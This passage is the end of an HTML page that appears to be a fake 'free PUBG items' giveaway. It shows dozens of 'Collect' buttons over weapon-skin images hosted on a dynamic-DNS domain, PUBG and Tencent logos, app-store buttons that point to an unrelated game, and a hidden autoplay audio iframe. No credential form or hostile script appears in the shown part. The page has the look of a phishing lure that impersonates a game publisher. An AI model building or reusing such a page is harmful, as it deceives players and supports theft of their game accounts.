<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/042.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/043.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/044.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/045.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/046.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/047.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/048.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/049.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/050.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/051.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/052.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/074.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/075.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/076.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/053.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/054.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/055.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/056.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/057.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/058.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/059.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/060.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/061.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/062.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/063.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/064.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/065.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/066.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/067.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/068.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/069.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/070.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/071.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/072.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/073.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/077.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/078.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/079.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/080.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/081.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/082.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/083.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/023.png">
<a href="#collected" class="buy">Collect</a>
</div>
<div class="item last">
<img class="thumbnail" src="http://freenew-claimpubg.dnset.com/img/firearms/078.png">
<a href="#collected" class="buy">Collect</a>
</div>
</div>
</div>


<div class="notification-container">
<div class="button">
<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
<a href="https://play.google.com/store/apps/details?id=com.mobile.legends">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
</div>
</div>


<iframe scrolling="no" allow="autoplay" src="https://b.top4top.net/m_11724m6w30.mp3" width="0" height="0" frameborder="no"></iframe>

<div class="footer">
<center>
<img style="margin-right:5px" width="30" src="http://freenew-claimpubg.dnset.com/img/pubg.png">
<img width="80" src="http://freenew-claimpubg.dnset.com/img/tencent.png">
</center>
</div>

<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none";
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1}
    slides[slideIndex-1].style.display = "block";
    setTimeout(showSlides, 2500);
}
</script>


</body>

</html>